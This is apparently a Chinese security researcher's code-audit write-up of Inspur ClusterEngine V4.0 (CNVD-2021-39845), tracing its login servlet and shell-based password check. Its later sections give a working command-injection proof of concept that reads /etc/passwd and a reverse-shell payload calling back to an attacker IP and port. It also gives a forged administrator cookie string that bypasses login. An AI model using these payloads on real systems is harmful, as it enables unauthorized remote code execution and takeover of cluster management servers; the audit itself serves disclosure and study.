---
layout: about
category: about
Researchname:  浪潮ClusterEngineV4.0代码审计历程
toc: true
permalink: /about/inspur-Cluster-Engine-V4.0-code-aduit-walkthrough/
---

## *CNVD-2021-39845 - 浪潮ClusterEngine V4.0存在逻辑缺陷漏洞*

- 2021年 5月21日 星期日 00时11分58秒 CST
    - 最近一直在看代码，正好前两天在网上冲浪的时候看到浪潮的一个RCE，就拿过来分析一下试试看
- 2021年 5月31日 星期一 22时55分49秒 CST
    - 上传相关代码至[*bigger-than-bigger*仓库：点击查看相关代码](https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV/Inspur%20Cluster%20Engine%20v4/java%20code)

先看`web.xml`定义的servlet；
```xml
<servlet>
    <servlet-name>login</servlet-name>
    <servlet-class>
        com.inspur.tsce4.login.Servlet
    </servlet-class>
</servlet>
```
指向`com.inspur.tsce4.login.Servlet`类，直接去看login：`WEB-INF/classes/com/inspur/tsce4/login/Servlet`类：

```java
public class Servlet extends HttpServlet {
    public Servlet() {
    }
    public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        request.setCharacterEncoding("utf-8");
        Management manage = new Management(request, response);
        manage.doResponse();
    }
    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        this.doPost(request, response);
    }
}
```
继承了HttpServlet，dopost方法调用Management：


```java
public class Management {
    
    HttpServletRequest request;
    HttpServletResponse response;
    Command command = new Command();

}

```
我个人不太喜欢贴大段代码，自己写着累，看的人也累，因为代码只更像是我们生活中聊天时候的互动手势，一定是辅助作用而不是表达主题；于是我便大致画了一下我理解的web认证Java代码跳转逻辑，方便理解：

![](/static/web-image/inspur-CEV4-Code-audit/inspur-code-running-logic.png)


- `command()` -> 对应是运行服务器上的`user_auth.sh`脚本：
    - [点击以查看代码](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CoVV/Inspur%20Cluster%20Engine%20v4/java%20code/userAuth.sh)
    - 来看看代码主要运行逻辑，主要为以下逻辑：
    ![](/static/web-image/inspur-CEV4-Code-audit/user-auth-logic.png)

运行程序先判断传入参数个数紧 接着对第一个传入参数进行简单的特殊字符过后进行比对，代码如下：

```bash
uname echo $1 | awk -F "" '{for(i=1;i<=NF;i++){if ($i ~ /[a-zA-Z0-9_]/) {str=$i;str1=(str1 str)}}print str1}'
if [ a"$uname"b != a"$1"b ]; then
   echo the user $1 format is illegal
   echo error:1
   exit 1;
fi

#简单做了一个过滤实验，但是一对符号如() ''等都无法过滤
➜ echo a-d-c.\/ | awk -F "" '{for(i=1;i<=NF;i++){if ($i ~ /[a-zA-Z0-9_]/) {str=$i;str1=(str1 str)}}print str1}'
adc

```
其中进行算法识别的代码只能在redhat系统运行，中文环境下的redhat系统`crypt`换成`加密`即可：

`encrypt=$(passwd -S root | sed -rn 's/.* (\w+) crypt.*/\1/p')` 

<a href=""> <i class="fa fa-hand-o-down"></i></a> 

`encrypt=$(passwd -S root | sed -rn 's/.* (\w+) 加密.*/\1/p')`

```bash
➜ docker run -d hjd48/redhat
➜ docker exec -it c2739bba0d86 /bin/bash

##redhat 6国内换源
bash-4.1# cd /etc/yum.repos.d/ && mkdir tmp && mv *.repo tmp 
bash-4.1# wget -O /etc/yum.repos.d/CentOS-Base.repo https://static.lty.fun/%E5%85%B6%E4%BB%96%E8%B5%84%E6%BA%90/SourcesList/Centos-6-Vault-Aliyun.repo

##encrypt 获取过程
bash-4.1# uname -a
Linux c2739bba0d86 5.10.25-linuxkit #1 SMP Tue Mar 23 09:27:39 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
bash-4.1# cat /etc/issue
Red Hat Enterprise Linux Server release 6.3 (Santiago)
Kernel \r on an \m

bash-4.1# passwd -S root | sed -rn 's/.* (\w+) 加密.*/\1/p'
SHA512

##用户认证过程
bash-4.1# bash user_auth.sh root zanghun123
root
arootb
arootb
$6$s8LxZk5w$VUlASup50b9gmquJS6BT6YhDGHwTZThCRQeXRi12bHq8gAgxhSuqO5R7Jwm6p62lEyL4na16tG21gtBV1KaOV.
encrypt: SHA512
s8LxZk5w
passwd_shadow: $6$s8LxZk5w$VUlASup50b9gmquJS6BT6YhDGHwTZThCRQeXRi12bHq8gAgxhSuqO5R7Jwm6p62lEyL4na16tG21gtBV1KaOV.
passwd_t: $6$s8LxZk5w$VUlASup50b9gmquJS6BT6YhDGHwTZThCRQeXRi12bHq8gAgxhSuqO5R7Jwm6p62lEyL4na16tG21gtBV1KaOV.
true
```

### 0x01：远程代码执行

用户认证的逻辑基本如此，我们可以看到在web应用层针对用户的认证就是bash代码进行用户哈希值比对的结果，是以这样的参数传入：`bash user_auth.sh $username $passwd`

所以就导致了RCE，原理也十分简单，我们在web层的传入`$username 和 $passwd `两个参数可控，Linux环境下对传入参数使用符号：<code> $ ` () </code> 进行变量替换即可：

```
bash-4.1# cd touch-test/
bash-4.1# ls
bash-4.1# pwd
/tmp/touch-test
bash-4.1# $(touch id)
bash-4.1# ls
id
bash-4.1# $(id)
bash: uid=0(root): command not found
```
所以传入参数进行RCE即可；
![](/static/web-image/inspur-CEV4-Code-audit/user_auth_rce.png)

poc代码：
```
# POC测试(出现 root:x:0:0 则存在漏洞)

op=login&username=peiqi`$(cat /etc/passwd)`
{"err":"/bin/sh: root:x:0:0:root:/root:/bin/bash: No such file or directory\n","exitcode":1,"out":"the user peiqi does not exist\nerror:1\n"}

# 反弹shell
op=login&username=peiqi`$(bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{IP}}%2F{PORT}%200%3E%261)`

```

#### 参考

- [浪潮ClusterEngineV4.0 任意命令执行](https://github.com/hhroot/2021_Hvv/blob/main/%E6%B5%AA%E6%BD%AE%20ClusterEngineV4.0%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md
)

### 0x02：Cookie伪造登录

- `com.inspur.tsce4.Management.login() - Management.getCookie() - Management.loginOut()`

```java
public class Management {
private void getCookie() {
        String key = this.request.getParameter("name");
        JSONObject result = new JSONObject();
        Cookie[] cookies = this.request.getCookies();
        Cookie cookie = null;
        Cookie userCookie = null;
        Cookie L_TIMES_cookie = null;
        if (cookies != null) {
            for(int i = 0; i < cookies.length; ++i) {
                if (cookies[i].getName().equals(key)) {
                    cookie = cookies[i];
                } else if (cookies[i].getName().equals("username")) {
                    userCookie = cookies[i];
                } else if (cookies[i].getName().equals("L_TIMES")) {
                    L_TIMES_cookie = cookies[i];
                }
            }
        }

        if (userCookie == null && key.equals("username")) {
            userCookie = cookie;
        }

        if (clearUserList.containsKey(userCookie.getValue()) && userCookie != null && key.equals("vertifyUser")) {
            Long now = (new Date()).getTime();
            Long addTime = ((Date)clearUserList.get(userCookie.getValue())).getTime();
            if (now - addTime > 43200000L) {
                clearUserList.remove(userCookie.getValue());
            } else if (addTime - Long.parseLong(L_TIMES_cookie.getValue()) > 0L) {
                Cookie cookieAuth = new Cookie("vertifyUser", "false");
                cookieAuth.setMaxAge(43200);
                cookieAuth.setPath("/");
                cookieAuth.setHttpOnly(true);
                this.response.addCookie(cookieAuth);
                cookie = null;
            }
        }

        try {
            if (cookie != null) {
                result.put("result", "true");
                result.put("value", cookie.getValue());
            } else {
                result.put("result", "false");
            }

            JsonUtil.respnseJson(this.response, result.toString());
        } catch (JSONException var10) {
            JsonUtil.respnseJson(this.response, this.nullResJson.toString());
        }

    }
}
```

分析得：用户认证Cookie不存在随机性、时效性。所以我们可以直接伪造Cookie登入即可：`lang=cn; username=root; userType=administrator; vertifyUser=true`

![](/static/web-image/inspur-CEV4-Code-audit/user_auth_RF.png)

直接使用Cookie插件ModHeader带入Cookie，直接登入：

![](/static/web-image/inspur-CEV4-Code-audit/inspur_cookie_SF.png)

---

以上。

